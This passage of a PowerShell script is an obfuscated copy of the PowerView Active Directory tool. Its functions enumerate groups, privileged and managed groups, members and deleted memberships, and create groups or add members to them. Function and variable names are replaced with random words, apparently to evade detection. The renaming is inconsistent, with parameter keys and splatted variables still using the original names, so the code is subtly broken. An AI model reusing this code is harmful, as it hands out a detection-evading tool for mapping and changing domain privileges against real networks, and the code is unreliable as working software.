                            $IhrLlPlN99 = indenturing @SearcherArguments
                            if (-not $IhrLlPlN99) {
                                Write-Warning "[floors] Unable to retrieve domain searcher for '$chKaCwXV99'"
                            }
                        }
                    }
                    elseif ($SvGoFRkz99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $PFeUtWYw99 = (([Guid]$SvGoFRkz99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $hAflFVrb99 += "(objectguid=$PFeUtWYw99)"
                    }
                    elseif ($SvGoFRkz99.Contains('\')) {
                        $upTkBJHa99 = $SvGoFRkz99.Replace('\28', '(').Replace('\29', ')') | macrocosms -xilKAxpM99 Canonical
                        if ($upTkBJHa99) {
                            $noeNUzwE99 = $upTkBJHa99.SubString(0, $upTkBJHa99.IndexOf('/'))
                            $KegVfEPD99 = $SvGoFRkz99.Split('\')[1]
                            $hAflFVrb99 += "(samAccountName=$KegVfEPD99)"
                            $VrICpjXS99['Domain'] = $noeNUzwE99
                            Write-Verbose "[floors] Extracted domain '$noeNUzwE99' from '$SvGoFRkz99'"
                            $IhrLlPlN99 = indenturing @SearcherArguments
                        }
                    }
                    else {
                        $hAflFVrb99 += "(|(samAccountName=$SvGoFRkz99)(name=$SvGoFRkz99))"
                    }
                }
                if ($hAflFVrb99 -and ($hAflFVrb99.Trim() -ne '') ) {
                    $tGcqvLrx99 += "(|$hAflFVrb99)"
                }
                if ($PSBoundParameters['AdminCount']) {
                    Write-Verbose '[floors] Searching for adminCount=1'
                    $tGcqvLrx99 += '(admincount=1)'
                }
                if ($PSBoundParameters['GroupScope']) {
                    $ZernoiMX99 = $PSBoundParameters['GroupScope']
                    $tGcqvLrx99 = Switch ($ZernoiMX99) {
                        'DomainLocal'       { '(groupType:1.2.840.113556.1.4.803:=4)' }
                        'NotDomainLocal'    { '(!(groupType:1.2.840.113556.1.4.803:=4))' }
                        'Global'            { '(groupType:1.2.840.113556.1.4.803:=2)' }
                        'NotGlobal'         { '(!(groupType:1.2.840.113556.1.4.803:=2))' }
                        'Universal'         { '(groupType:1.2.840.113556.1.4.803:=8)' }
                        'NotUniversal'      { '(!(groupType:1.2.840.113556.1.4.803:=8))' }
                    }
                    Write-Verbose "[floors] Searching for group scope '$ZernoiMX99'"
                }
                if ($PSBoundParameters['GroupProperty']) {
                    $SBGWfDtr99 = $PSBoundParameters['GroupProperty']
                    $tGcqvLrx99 = Switch ($SBGWfDtr99) {
                        'Security'              { '(groupType:1.2.840.113556.1.4.803:=2147483648)' }
                        'Distribution'          { '(!(groupType:1.2.840.113556.1.4.803:=2147483648))' }
                        'CreatedBySystem'       { '(groupType:1.2.840.113556.1.4.803:=1)' }
                        'NotCreatedBySystem'    { '(!(groupType:1.2.840.113556.1.4.803:=1))' }
                    }
                    Write-Verbose "[floors] Searching for group property '$SBGWfDtr99'"
                }
                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[floors] Using additional LDAP filter: $vqxjYeAS99"
                    $tGcqvLrx99 += "$vqxjYeAS99"
                }
                $IhrLlPlN99.filter = "(&(objectCategory=group)$tGcqvLrx99)"
                Write-Verbose "[floors] filter string: $($IhrLlPlN99.filter)"
                if ($PSBoundParameters['FindOne']) { $jAOXTyAF99 = $IhrLlPlN99.FindOne() }
                else { $jAOXTyAF99 = $IhrLlPlN99.FindAll() }
                $jAOXTyAF99 | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {
                        $Group = $_
                    }
                    else {
                        $Group = favorites -PjvsRTzX99 $_.Properties
                    }
                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                    $Group
                }
                if ($jAOXTyAF99) {
                    try { $jAOXTyAF99.dispose() }
                    catch {
                        Write-Verbose "[floors] Error disposing of the Results object"
                    }
                }
                $IhrLlPlN99.dispose()
            }
        }
    }
}
function gridlocks {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.GroupPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $ryaimXPz99,
        [ValidateNotNullOrEmpty()]
        [String]
        $Name,
        [ValidateNotNullOrEmpty()]
        [String]
        $SBWmjmDy99,
        [ValidateNotNullOrEmpty()]
        [String]
        $YgmZxNNi99,
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    $VAidWYXW99 = @{
        'Identity' = $ryaimXPz99
    }
    if ($PSBoundParameters['Domain']) { $VAidWYXW99['Domain'] = $gddrYpaX99 }
    if ($PSBoundParameters['Credential']) { $VAidWYXW99['Credential'] = $xjRyyQze99 }
    $OWKsdjuY99 = optics @ContextArguments
    if ($OWKsdjuY99) {
        $Group = New-Object -TypeName System.DirectoryServices.AccountManagement.GroupPrincipal -ArgumentList ($OWKsdjuY99.Context)
        $Group.SamAccountName = $OWKsdjuY99.Identity
        if ($PSBoundParameters['Name']) {
            $Group.Name = $Name
        }
        else {
            $Group.Name = $OWKsdjuY99.Identity
        }
        if ($PSBoundParameters['DisplayName']) {
            $Group.DisplayName = $SBWmjmDy99
        }
        else {
            $Group.DisplayName = $OWKsdjuY99.Identity
        }
        if ($PSBoundParameters['Description']) {
            $Group.Description = $YgmZxNNi99
        }
        Write-Verbose "[gridlocks] Attempting to create group '$ryaimXPz99'"
        try {
            $Null = $Group.Save()
            Write-Verbose "[gridlocks] Group '$ryaimXPz99' successfully created"
            $Group
        }
        catch {
            Write-Warning "[gridlocks] Error creating group '$ryaimXPz99' : $_"
        }
    }
}
function gainsaid {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ManagedSecurityGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $kNJfXSCC99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [Switch]
        $kQTByXSX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $VrICpjXS99 = @{
            'LDAPFilter' = '(&(managedBy=*)(groupType:1.2.840.113556.1.4.803:=2147483648))'
            'Properties' = 'distinguishedName,managedBy,samaccounttype,samaccountname'
        }
        if ($PSBoundParameters['SearchBase']) { $VrICpjXS99['SearchBase'] = $kNJfXSCC99 }
        if ($PSBoundParameters['Server']) { $VrICpjXS99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $VrICpjXS99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $VrICpjXS99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $VrICpjXS99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['SecurityMasks']) { $VrICpjXS99['SecurityMasks'] = $VnyrBvDm99 }
        if ($PSBoundParameters['Tombstone']) { $VrICpjXS99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $VrICpjXS99['Credential'] = $xjRyyQze99 }
    }
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $VrICpjXS99['Domain'] = $gddrYpaX99
            $udnfiLvJ99 = $gddrYpaX99
        }
        else {
            $udnfiLvJ99 = $Env:USERDNSDOMAIN
        }
        floors @SearcherArguments | ForEach-Object {
            $VrICpjXS99['Properties'] = 'distinguishedname,name,samaccounttype,samaccountname,objectsid'
            $VrICpjXS99['Identity'] = $_.managedBy
            $Null = $VrICpjXS99.Remove('LDAPFilter')
            $olArrzfI99 = scram @SearcherArguments
            $pRSVYZKp99 = New-Object PSObject
            $pRSVYZKp99 | Add-Member Noteproperty 'GroupName' $_.samaccountname
            $pRSVYZKp99 | Add-Member Noteproperty 'GroupDistinguishedName' $_.distinguishedname
            $pRSVYZKp99 | Add-Member Noteproperty 'ManagerName' $olArrzfI99.samaccountname
            $pRSVYZKp99 | Add-Member Noteproperty 'ManagerDistinguishedName' $olArrzfI99.distinguishedName
            if ($olArrzfI99.samaccounttype -eq 0x10000000) {
                $pRSVYZKp99 | Add-Member Noteproperty 'ManagerType' 'Group'
            }
            elseif ($olArrzfI99.samaccounttype -eq 0x30000000) {
                $pRSVYZKp99 | Add-Member Noteproperty 'ManagerType' 'User'
            }
            $QYytNtzC99 = @{
                'Identity' = $_.distinguishedname
                'RightsFilter' = 'WriteMembers'
            }
            if ($PSBoundParameters['Server']) { $QYytNtzC99['Server'] = $GejzMkbd99 }
            if ($PSBoundParameters['SearchScope']) { $QYytNtzC99['SearchScope'] = $yuycROvu99 }
            if ($PSBoundParameters['ResultPageSize']) { $QYytNtzC99['ResultPageSize'] = $vUSyLBJJ99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $QYytNtzC99['ServerTimeLimit'] = $cNGaYdSy99 }
            if ($PSBoundParameters['Tombstone']) { $QYytNtzC99['Tombstone'] = $kQTByXSX99 }
            if ($PSBoundParameters['Credential']) { $QYytNtzC99['Credential'] = $xjRyyQze99 }
            $pRSVYZKp99 | Add-Member Noteproperty 'ManagerCanWrite' 'UNKNOWN'
            $pRSVYZKp99.PSObject.TypeNames.Insert(0, 'PowerView.ManagedSecurityGroup')
            $pRSVYZKp99
        }
    }
}
function Twitter {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $phaEiMpW99,
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [Parameter(ParameterSetName = 'ManualRecurse')]
        [Switch]
        $GdVVUHJX99,
        [Parameter(ParameterSetName = 'RecurseUsingMatchingRule')]
        [Switch]
        $pZxMKTgL99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $vqxjYeAS99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $kNJfXSCC99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $VnyrBvDm99,
        [Switch]
        $kQTByXSX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $VrICpjXS99 = @{
            'Properties' = 'member,samaccountname,distinguishedname'
        }
        if ($PSBoundParameters['Domain']) { $VrICpjXS99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['LDAPFilter']) { $VrICpjXS99['LDAPFilter'] = $vqxjYeAS99 }
        if ($PSBoundParameters['SearchBase']) { $VrICpjXS99['SearchBase'] = $kNJfXSCC99 }
        if ($PSBoundParameters['Server']) { $VrICpjXS99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $VrICpjXS99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $VrICpjXS99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $VrICpjXS99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['Tombstone']) { $VrICpjXS99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $VrICpjXS99['Credential'] = $xjRyyQze99 }
        $OSvdjCmE99 = @{}
        if ($PSBoundParameters['Domain']) { $OSvdjCmE99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['Server']) { $OSvdjCmE99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['Credential']) { $OSvdjCmE99['Credential'] = $xjRyyQze99 }
    }
    PROCESS {
        $IhrLlPlN99 = indenturing @SearcherArguments
        if ($IhrLlPlN99) {
            if ($PSBoundParameters['RecurseUsingMatchingRule']) {
                $VrICpjXS99['Identity'] = $phaEiMpW99
                $VrICpjXS99['Raw'] = $True
                $Group = floors @SearcherArguments
                if (-not $Group) {
                    Write-Warning "[Twitter] Error searching for group with identity: $phaEiMpW99"
                }
                else {
                    $HHBjReWz99 = $Group.properties.item('samaccountname')[0]
                    $RZxsuOmE99 = $Group.properties.item('distinguishedname')[0]
                    if ($PSBoundParameters['Domain']) {
                        $LdOSiNIc99 = $gddrYpaX99
                    }
                    else {
                        if ($RZxsuOmE99) {
                            $LdOSiNIc99 = $RZxsuOmE99.SubString($RZxsuOmE99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    Write-Verbose "[Twitter] Using LDAP matching rule to recurse on '$RZxsuOmE99', only user accounts will be returned."
                    $IhrLlPlN99.filter = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$RZxsuOmE99))"
                    $IhrLlPlN99.PropertiesToLoad.AddRange(('distinguishedName'))
                    $gwHuJhvi99 = $IhrLlPlN99.FindAll() | ForEach-Object {$_.Properties.distinguishedname[0]}
                }
                $Null = $VrICpjXS99.Remove('Raw')
            }
            else {
                $hAflFVrb99 = ''
                $tGcqvLrx99 = ''
                $phaEiMpW99 | Where-Object {$_} | ForEach-Object {
                    $SvGoFRkz99 = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($SvGoFRkz99 -match '^S-1-') {
                        $hAflFVrb99 += "(objectsid=$SvGoFRkz99)"
                    }
                    elseif ($SvGoFRkz99 -match '^CN=') {
                        $hAflFVrb99 += "(distinguishedname=$SvGoFRkz99)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            $chKaCwXV99 = $SvGoFRkz99.SubString($SvGoFRkz99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[Twitter] Extracted domain '$chKaCwXV99' from '$SvGoFRkz99'"
                            $VrICpjXS99['Domain'] = $chKaCwXV99
                            $IhrLlPlN99 = indenturing @SearcherArguments
                            if (-not $IhrLlPlN99) {
                                Write-Warning "[Twitter] Unable to retrieve domain searcher for '$chKaCwXV99'"
                            }
                        }
                    }
                    elseif ($SvGoFRkz99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $PFeUtWYw99 = (([Guid]$SvGoFRkz99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $hAflFVrb99 += "(objectguid=$PFeUtWYw99)"
                    }
                    elseif ($SvGoFRkz99.Contains('\')) {
                        $upTkBJHa99 = $SvGoFRkz99.Replace('\28', '(').Replace('\29', ')') | macrocosms -xilKAxpM99 Canonical
                        if ($upTkBJHa99) {
                            $noeNUzwE99 = $upTkBJHa99.SubString(0, $upTkBJHa99.IndexOf('/'))
                            $KegVfEPD99 = $SvGoFRkz99.Split('\')[1]
                            $hAflFVrb99 += "(samAccountName=$KegVfEPD99)"
                            $VrICpjXS99['Domain'] = $noeNUzwE99
                            Write-Verbose "[Twitter] Extracted domain '$noeNUzwE99' from '$SvGoFRkz99'"
                            $IhrLlPlN99 = indenturing @SearcherArguments
                        }
                    }
                    else {
                        $hAflFVrb99 += "(samAccountName=$SvGoFRkz99)"
                    }
                }
                if ($hAflFVrb99 -and ($hAflFVrb99.Trim() -ne '') ) {
                    $tGcqvLrx99 += "(|$hAflFVrb99)"
                }
                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[Twitter] Using additional LDAP filter: $vqxjYeAS99"
                    $tGcqvLrx99 += "$vqxjYeAS99"
                }
                $IhrLlPlN99.filter = "(&(objectCategory=group)$tGcqvLrx99)"
                Write-Verbose "[Twitter] Twitter filter string: $($IhrLlPlN99.filter)"
                try {
                    $XUqUetvM99 = $IhrLlPlN99.FindOne()
                }
                catch {
                    Write-Warning "[Twitter] Error searching for group with identity '$phaEiMpW99': $_"
                    $gwHuJhvi99 = @()
                }
                $HHBjReWz99 = ''
                $RZxsuOmE99 = ''
                if ($XUqUetvM99) {
                    $gwHuJhvi99 = $XUqUetvM99.properties.item('member')
                    if ($gwHuJhvi99.count -eq 0) {
                        $JHHPGMMg99 = $False
                        $jkLmSFVz99 = 0
                        $Top = 0
                        while (-not $JHHPGMMg99) {
                            $Top = $jkLmSFVz99 + 1499
                            $mMVxyDNw99="member;range=$jkLmSFVz99-$Top"
                            $jkLmSFVz99 += 1500
                            $Null = $IhrLlPlN99.PropertiesToLoad.Clear()
                            $Null = $IhrLlPlN99.PropertiesToLoad.Add("$mMVxyDNw99")
                            $Null = $IhrLlPlN99.PropertiesToLoad.Add('samaccountname')
                            $Null = $IhrLlPlN99.PropertiesToLoad.Add('distinguishedname')
                            try {
                                $XUqUetvM99 = $IhrLlPlN99.FindOne()
                                $ddApVkPY99 = $XUqUetvM99.Properties.PropertyNames -like "member;range=*"
                                $gwHuJhvi99 += $XUqUetvM99.Properties.item($ddApVkPY99)
                                $HHBjReWz99 = $XUqUetvM99.properties.item('samaccountname')[0]
                                $RZxsuOmE99 = $XUqUetvM99.properties.item('distinguishedname')[0]
                                if ($gwHuJhvi99.count -eq 0) {
                                    $JHHPGMMg99 = $True
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                $JHHPGMMg99 = $True
                            }
                        }
                    }
                    else {
                        $HHBjReWz99 = $XUqUetvM99.properties.item('samaccountname')[0]
                        $RZxsuOmE99 = $XUqUetvM99.properties.item('distinguishedname')[0]
                        $gwHuJhvi99 += $XUqUetvM99.Properties.item($ddApVkPY99)
                    }
                    if ($PSBoundParameters['Domain']) {
                        $LdOSiNIc99 = $gddrYpaX99
                    }
                    else {
                        if ($RZxsuOmE99) {
                            $LdOSiNIc99 = $RZxsuOmE99.SubString($RZxsuOmE99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                }
            }
            ForEach ($FEdwNfjR99 in $gwHuJhvi99) {
                if ($GdVVUHJX99 -and $lQSKApoC99) {
                    $PjvsRTzX99 = $_.Properties
                }
                else {
                    $jhaZyveK99 = $VrICpjXS99.Clone()
                    $jhaZyveK99['Identity'] = $FEdwNfjR99
                    $jhaZyveK99['Raw'] = $True
                    $jhaZyveK99['Properties'] = 'distinguishedname,cn,samaccountname,objectsid,objectclass'
                    $Object = scram @ObjectSearcherArguments
                    $PjvsRTzX99 = $Object.Properties
                }
                if ($PjvsRTzX99) {
                    $NlfDhdoC99 = New-Object PSObject
                    $NlfDhdoC99 | Add-Member Noteproperty 'GroupDomain' $LdOSiNIc99
                    $NlfDhdoC99 | Add-Member Noteproperty 'GroupName' $HHBjReWz99
                    $NlfDhdoC99 | Add-Member Noteproperty 'GroupDistinguishedName' $RZxsuOmE99
                    if ($PjvsRTzX99.objectsid) {
                        $KjCsuQHp99 = ((New-Object System.Security.Principal.SecurityIdentifier $PjvsRTzX99.objectsid[0], 0).Value)
                    }
                    else {
                        $KjCsuQHp99 = $Null
                    }
                    try {
                        $xZQGyaOK99 = $PjvsRTzX99.distinguishedname[0]
                        if ($xZQGyaOK99 -match 'ForeignSecurityPrincipals|S-1-5-21') {
                            try {
                                if (-not $KjCsuQHp99) {
                                    $KjCsuQHp99 = $PjvsRTzX99.cn[0]
                                }
                                $sqDhyuYO99 = macrocosms -phaEiMpW99 $KjCsuQHp99 -xilKAxpM99 'DomainSimple' @ADNameArguments
                                if ($sqDhyuYO99) {
                                    $BTmZocnX99 = $sqDhyuYO99.Split('@')[1]
                                }
                                else {
                                    Write-Warning "[Twitter] Error converting $xZQGyaOK99"
                                    $BTmZocnX99 = $Null
                                }
                            }
                            catch {
                                Write-Warning "[Twitter] Error converting $xZQGyaOK99"
                                $BTmZocnX99 = $Null
                            }
                        }
                        else {
                            $BTmZocnX99 = $xZQGyaOK99.SubString($xZQGyaOK99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    catch {
                        $xZQGyaOK99 = $Null
                        $BTmZocnX99 = $Null
                    }
                    if ($PjvsRTzX99.samaccountname) {
                        $nQXDaGVr99 = $PjvsRTzX99.samaccountname[0]
                    }
                    else {
                        try {
                            $nQXDaGVr99 = exaggerations -ObjectSID $PjvsRTzX99.cn[0] @ADNameArguments
                        }
                        catch {
                            $nQXDaGVr99 = $PjvsRTzX99.cn[0]
                        }
                    }
                    if ($PjvsRTzX99.objectclass -match 'computer') {
                        $eHDrKtrv99 = 'computer'
                    }
                    elseif ($PjvsRTzX99.objectclass -match 'group') {
                        $eHDrKtrv99 = 'group'
                    }
                    elseif ($PjvsRTzX99.objectclass -match 'user') {
                        $eHDrKtrv99 = 'user'
                    }
                    else {
                        $eHDrKtrv99 = $Null
                    }
                    $NlfDhdoC99 | Add-Member Noteproperty 'MemberDomain' $BTmZocnX99
                    $NlfDhdoC99 | Add-Member Noteproperty 'MemberName' $nQXDaGVr99
                    $NlfDhdoC99 | Add-Member Noteproperty 'MemberDistinguishedName' $xZQGyaOK99
                    $NlfDhdoC99 | Add-Member Noteproperty 'MemberObjectClass' $eHDrKtrv99
                    $NlfDhdoC99 | Add-Member Noteproperty 'MemberSID' $KjCsuQHp99
                    $NlfDhdoC99.PSObject.TypeNames.Insert(0, 'PowerView.GroupMember')
                    $NlfDhdoC99
                    if ($PSBoundParameters['Recurse'] -and $xZQGyaOK99 -and ($eHDrKtrv99 -match 'group')) {
                        Write-Verbose "[Twitter] Manually recursing on group: $xZQGyaOK99"
                        $VrICpjXS99['Identity'] = $xZQGyaOK99
                        $Null = $VrICpjXS99.Remove('Properties')
                        Twitter @SearcherArguments
                    }
                }
            }
            $IhrLlPlN99.dispose()
        }
    }
}
function infallibly {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.DomainGroupMemberDeleted')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $phaEiMpW99,
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $vqxjYeAS99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $kNJfXSCC99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [Switch]
        $kQTByXSX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $VrICpjXS99 = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   $True
            'LDAPFilter'    =   '(objectCategory=group)'
        }
        if ($PSBoundParameters['Domain']) { $VrICpjXS99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['LDAPFilter']) { $VrICpjXS99['LDAPFilter'] = $vqxjYeAS99 }
        if ($PSBoundParameters['SearchBase']) { $VrICpjXS99['SearchBase'] = $kNJfXSCC99 }
        if ($PSBoundParameters['Server']) { $VrICpjXS99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $VrICpjXS99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $VrICpjXS99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $VrICpjXS99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['Tombstone']) { $VrICpjXS99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $VrICpjXS99['Credential'] = $xjRyyQze99 }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $VrICpjXS99['Identity'] = $phaEiMpW99 }
        scram @SearcherArguments | ForEach-Object {
            $MEFGOmzQ99 = $_.Properties['distinguishedname'][0]
            ForEach($sWpoyMOt99 in $_.Properties['msds-replvaluemetadata']) {
                $ejQLnGPz99 = [xml]$sWpoyMOt99 | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
                if ($ejQLnGPz99) {
                    if (($ejQLnGPz99.pszAttributeName -Match 'member') -and (($ejQLnGPz99.dwVersion % 2) -eq 0 )) {
                        $jmVDoyyB99 = New-Object PSObject
                        $jmVDoyyB99 | Add-Member NoteProperty 'GroupDN' $MEFGOmzQ99
                        $jmVDoyyB99 | Add-Member NoteProperty 'MemberDN' $ejQLnGPz99.pszObjectDn
                        $jmVDoyyB99 | Add-Member NoteProperty 'TimeFirstAdded' $ejQLnGPz99.ftimeCreated
                        $jmVDoyyB99 | Add-Member NoteProperty 'TimeDeleted' $ejQLnGPz99.ftimeDeleted
                        $jmVDoyyB99 | Add-Member NoteProperty 'LastOriginatingChange' $ejQLnGPz99.ftimeLastOriginatingChange
                        $jmVDoyyB99 | Add-Member NoteProperty 'TimesAdded' ($ejQLnGPz99.dwVersion / 2)
                        $jmVDoyyB99 | Add-Member NoteProperty 'LastOriginatingDsaDN' $ejQLnGPz99.pszLastOriginatingDsaDN
                        $jmVDoyyB99.PSObject.TypeNames.Insert(0, 'PowerView.DomainGroupMemberDeleted')
                        $jmVDoyyB99
                    }
                }
                else {
                    Write-Verbose "[infallibly] Error retrieving 'msds-replvaluemetadata' for '$MEFGOmzQ99'"
                }
            }
        }
    }
}
function toreadors {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $phaEiMpW99,
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $gwHuJhvi99,
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $VAidWYXW99 = @{
            'Identity' = $phaEiMpW99
        }
        if ($PSBoundParameters['Domain']) { $VAidWYXW99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['Credential']) { $VAidWYXW99['Credential'] = $xjRyyQze99 }
        $bdFyeoyf99 = optics @ContextArguments
        if ($bdFyeoyf99) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($bdFyeoyf99.Context, $bdFyeoyf99.Identity)
            }
            catch {
                Write-Warning "[toreadors] Error finding the group identity '$phaEiMpW99' : $_"
            }
        }
    }
    PROCESS {
        if ($Group) {
            ForEach ($FEdwNfjR99 in $gwHuJhvi99) {
                if ($FEdwNfjR99 -match '.+\\.+') {
                    $VAidWYXW99['Identity'] = $FEdwNfjR99
                    $AeIFkklx99 = optics @ContextArguments
                    if ($AeIFkklx99) {
                        $PndMyEmp99 = $AeIFkklx99.Identity
                    }
                }
                else {
                    $AeIFkklx99 = $bdFyeoyf99
                    $PndMyEmp99 = $FEdwNfjR99
                }
                Write-Verbose "[toreadors] Adding member '$FEdwNfjR99' to group '$phaEiMpW99'"
                $FEdwNfjR99 = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($AeIFkklx99.Context, $PndMyEmp99)
                $Group.Members.Add($FEdwNfjR99)
                $Group.Save()
            }
        }
    }
}
function sleeks {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $phaEiMpW99,
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $gwHuJhvi99,
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $VAidWYXW99 = @{
